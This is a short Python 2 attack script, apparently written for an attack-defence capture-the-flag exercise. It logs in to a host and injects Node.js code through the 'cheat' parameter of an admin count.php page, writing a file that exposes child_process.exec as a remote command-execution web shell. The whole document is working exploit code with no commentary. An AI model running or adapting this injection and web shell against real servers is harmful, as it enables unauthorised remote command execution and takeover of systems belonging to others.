#!/usr/bin/env python


from http import http
from config import *
from function  import *
from urllib import quote
import time

def file_write(target,filename,contents,cookie):
    header = {"Cookie":cookie}
    res = "error"
    print "waiting to writes shell..."
    i = 0
    for content in contents:
	data = "require('fs').appendFile('" + filename +  "','" + content + "');1"
	if i==0:
	    data = "require('fs').writeFile('" + filename +  "','" + content + "');1"
	try:
	    res = http("get",target,target_port,"/ez_web/admin/count.php?cheat=" + quote(data),"",header)
	    i += 1
	except Exception,e:
	    dump_error(target,"something error happens","db_admin_attack.py db_admin_attack")
	    return False
    return True
from login import login
file_write("192.168.2.114","5",'exports.a=function(c){return require("child_process").exec(c);}',login("192.168.2.114")) 
